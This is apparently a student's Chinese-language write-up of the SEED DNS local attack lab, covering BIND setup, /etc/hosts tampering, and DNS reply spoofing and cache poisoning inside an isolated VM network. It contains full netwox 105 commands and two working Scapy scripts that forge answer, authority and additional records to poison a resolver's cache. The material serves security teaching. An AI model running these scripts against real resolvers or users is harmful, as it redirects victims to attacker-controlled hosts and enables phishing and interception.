# Lab Overview
DNS(Domain Name System)是因特网的电话簿，可以将主机名转为IP地址。DNS攻击就能重定向用户到一些恶意地址。 在这个实验中我们要重现DNS攻击，来理解DNS攻击是如何工作的。建立环境，首先要配置一个DNS服务器。这个Lab 包含以下主题：
- DNS 及其工作方式
- DNS 服务器配置
- DNS 缓存 poisoning attack
- 伪造DNS回应包
- 包嗅探与欺骗
- Scapy 工具

# Lab Task (Part I): Setting Up a Local DNS Server
在这个实验中我们要用到三台机器，one for Attacker, one for Victim and the other for the DNS server 。

```
10.0.2.128- Attacker
10.0.2.129- Victim
10.0.2.130- DNS Server
```
## Task 1: Configure the User Machine

启动三台VM，然后在VMB中修改B使用的DNS服务器，`sudo vim /etc/resolv.conf`,将`nameserver `改为`10.0.2.130`。然后运行`nslookup www.bing.com`解析一次主机名，我们可以在命令输出的第一行看到其使用的Server改为了`10.0.2.130`。
```
[10/12/19]seed@VM:~$ nslookup www.bing.com
Server:		10.0.2.130
Address:	10.0.2.130#53

Non-authoritative answer:
...
Name:	cn-0001.cn-msedge.net
Address: 202.89.233.101
Name:	cn-0001.cn-msedge.net
Address: 202.89.233.100
```

## Task 2: Set up a Local DNS Server
在官方文档中详细说明了如何用 `BIND (Berkeley Internet Name Domain)`搭建一个DNS服务器。因为在我们使用的seed Ubuntu中已经安装了，所以有兴趣可以读一读文档，在此我们直接跳过。

直接给出配置好的结果，当我们在VMB中`ping www.bing.com`时，其回向主机`10.0.2.130`发送DNS查询请求，然后DNS服务器会再此向`198.41.0.4`主机转发查询请求，得到结果后回复请求到VMB。因为 此时DNS服务器上还没有缓存，需要向外继续查询。
![2.1](_v_images/20191012153159411_24878.png)
而当DNS Server 已经缓存了主机需要查询的主机名时，会直接返回DNS回复。如下图所示。
![2.2](_v_images/20191012153550654_592.png)

## Task 3: Host a Zone in the Local DNS Server
setp1: Create zones. 打开`/etc/bind/named.conf`文件，添加以下内容。应当注意，example.com域名保留供文档使用，并不归任何人所有，因此可以安全地使用它。
```
// forward lookup( from hostname to IP)
zone "example.com" {
        type master;
        file "/etc/bind/example.com.db";
};

zone "0.168.192.in-addr.arpa" {
        type master;
        file "/etc/bind/192.168.0.db";
};

```
 Step2: Setup the forward lookup zone file. 上述 zone 定义中 file 关键字之后的文件名称为 zone 文件，这是实际DNS解析的存储位置。 在`/etc/bind/`目录中，创建以下`example.com.db` zone 文件。 对 zone 文件的语法感兴趣可以参考RFC 1035了解详细信息。
 
 Step 3: Set up the reverse lookup zone file. 对这边的知识不了解，所以直接按照步骤创建文件，再复制粘贴就好。也可以直接去网站上下载[Files that are Needed](https://seedsecuritylabs.org/Labs_16.04/Networking/DNS_Local/)

# Lab Tasks (Part II): Attacks on DNS
对用户进行DNS攻击的主要目的是，当用户尝试使用A的主机名进入计算机A时，将用户重定向到另一台计算机B。

我们将对`example.net`域发起一系列DNS攻击。 请注意，我们使用`example.net`作为我们的目标域，而不是`example.com`。 后者已经由我们自己的本地DNS服务器托管在设置中，因此不会发送DNS查询该域中的主机名。

## Task 4: Modifying the Host File
机器上的 host 文件记录了主机名到IP地址的映射，但此记录在Host文件中存在时，就不会发出DNS查询请求。IP`122.207.86.18`为中南大学图书馆。

```
$ sudo vim /etc/hosts
122.207.86.18 www.bank32.com
```
保存文件后 `ping www.bank32.com`可以发现地址解析为了图书馆IP。浏览器中输入主机名也同样会重定向到图书馆网站。
```
[10/12/19]seed@VM:~$ ping www.bank32.com
PING www.bank32.com (122.207.86.18) 56(84) bytes of data.
```

## Task 5: Directly Spoofing Response to User

![DNS欺骗攻击](_v_images/20191012172543638_12300.png)
如果伪造的DNS响应满足以下条件，则将被用户的计算机接受：
> 1. The source IP address must match the IP address of the DNS server.
> 2. The destination IP address must match the IP address of the user’s machine.
> 3. The source port number (UDP port) must match the port number that the DNS request was sent to
(usually port 53).
> 4. The destination port number must match the port number that the DNS request was sent from.
> 5. The UDP checksum must be correctly calculated.
> 6. The transaction ID must match the transaction ID in the DNS request.
> 7. The domain name in the question section of the reply must match the domain name in the question
> section of the request.
> 8. The domain name in the answer section must match the domain name in the question section of the
DNS request.
> 9. The User’s computer must receive the attacker’s DNS reply before it receives the legitimate DNS
response.

为了满足条件1到8，攻击者可以嗅探受害者发送的DNS请求消息。 然后创建一个伪造的DNS响应发送给受害者。 Netwox工具105提供了进行这种嗅探和响应的工具。 我们可以在回复数据包中组成任意的DNS回应。 此外，我们可以使用“filter”选项来指定要嗅探的数据包类型。 例如，通过使用`src host 10.0.2.129`，我们可以将嗅探的范围限制为仅来自主机10.0.2.18的数据包。

```
sudo netwox 105 --hostname www.example.net --hostnameip "122.207.86.18" --authns "ns.example.net" --authnsip "122.207.86.18" --device "ens33" --filter "src host 10.0.2.129"
```
在VM A主机上运行以上命令，在VMB 主机上`ping www.example.net`可看到请求重定向到了`122.207.86.18`上。而当VM A上不运行该程序时，会直接返回未知主机`ping: unknown host www.example.net`

![DNS劫持](_v_images/20191013171621337_14311.png)

## Task 6: DNS Cache Poisoning Attack
以上的攻击方法有一个很明显的缺点，每次用户查询都需要回复一个伪造的DNS回应包。所以接下来我们要去欺骗DNS服务器，然后让其缓存这个映射，之后每次都会从缓存中拿出结果回应给请求DNS查询的用户。这就是` DNS Cache Poisoning Attack`。

首先我们要修改Attacker的命令，将源主机IP改为DNS服务器的IP地址`10.0.2.130`，我们还使用ttl字段来表示我们希望假答案在DNS服务器的缓存中保留多长时间。 DNS服务器中毒后，我们可以停止Netwox 105程序。

```
sudo netwox 105 --hostname www.example.net --hostnameip "122.207.86.18" --authns "ns.example.net" --authnsip "122.207.86.18" --device "ens33" --filter "src host 10.0.2.130" --ttl 600 --spoofip raw
```

在DNS服务器上dump出缓存，结果如下：
```
[10/13/19]seed@VM:.../bind$ sudo rndc dumpdb -cache && sudo cat /var/cache/bind/dump.db| grep example
example.net.		172671	NS	a.iana-servers.net.
ns.example.net.		471	NS	ns.example.net.
www.example.net.	471	A	122.207.86.18
;		www.example.net A [lame TTL 471]
```

## Task 7: DNS Cache Poisoning: Targeting the Authority Section
在上一个任务中，我们的DNS缓存中毒攻击仅影响一个主机名，即www.example.net。 如果用户尝试获取另一个主机名的IP地址，例如mail.example.net，我们需要再次发起攻击。 如果我们发起一种可能影响整个example.net域的攻击，它将更加高效。

使用Scapy工具编写以下代码：

```
from scapy.all import *

def spoof_dns(pkt):
    if DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname:
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        an1 = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                    ttl=259200, rdata='122.207.86.18')
        # The Authority Sectio
        ns1 = DNSRR(rrname='example.net', type='NS',
                    ttl=259200, rdata='attacker32.com')
        ns2 = DNSRR(rrname='google.com', type='NS',
                    ttl=259200, rdata='attacker32.com')
        # The Additional Section
        ar1 = DNSRR(rrname='attacker32.com', type='A',
                    ttl=259200, rdata='122.207.86.18')
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=1, nscount=2, arcount=1,
                  an=an1, ns=ns1/ns2,ar=ar1)
        spoofpkt = ip/udp/dns
        send(spoofpkt, verbose=1)

pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
```
在VMA上运行以上代码，在DNS服务器上清缓存，然后在VMB中`ping www.example.net`，再执行`dig www.example.com`可的下图内容。
![task8](_v_images/20191013173148384_2884.png)


## Task 9: Targeting the Additional Section
在DNS答复中，有一个称为“附加节”的节，用于提供附加信息。 实际上，它主要用于为某些主机名提供IP地址，尤其是在“AUTHORITY ”部分中显示的主机名。 该任务的目的是欺骗本节中的某些条目，并查看它们是否将被目标本地DNS服务器成功缓存。

```
from scapy.all import *
def spoof_dns(pkt):
    if DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname:
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=53)
        an1 = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                    ttl=259200, rdata='122.207.86.18')
        # The Authority Sectio
        ns1 = DNSRR(rrname='example.net', type='NS',
                    ttl=259200, rdata='attacker32.com')
        ns2 = DNSRR(rrname='example.net', type='NS',
                    ttl=259200, rdata='ns.example.net')
        # The Additional Section
        ar1 = DNSRR(rrname='attacker32.com', type='A',
                    ttl=259200, rdata='1.2.3.4')
        ar2 = DNSRR(rrname='ns.example.net', type='A',
                    ttl=259200, rdata='5.6.7.8')
        ar3 = DNSRR(rrname='www.facebook.com', type='A',
                    ttl=259200, rdata='3.4.5.6')
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=1, nscount=2, arcount=3,
                  an=an1, ns=ns1/ns2, ar=ar1/ar2/ar3)
        spoofpkt = ip/udp/dns
        send(spoofpkt, verbose=1)

pkt = sniff(filter='udp and dst port 53', prn=spoof_dns)
```
在VMA上运行以上代码，在DNS服务器上清缓存，然后在VMB中`ping www.example.net`，再执行`dig www.example.com`可的下图内容。
![task9](_v_images/20191013181929641_6732.png)

# 实验总结
这个实现还比较简单的，从原理上也比较容易理解。实验的难点在于对DNS协议具体的内容熟悉。

那么如何防范DNS攻击呢？首先，最好使用公共DNS服务器，远离不受信任的网站，避免下载网页上的文件。定期查看hosts文件是否正常，是否被篡改。

总的来说，这个实验没什么新的知识可以汲取，不如CPU Cache攻击有意思。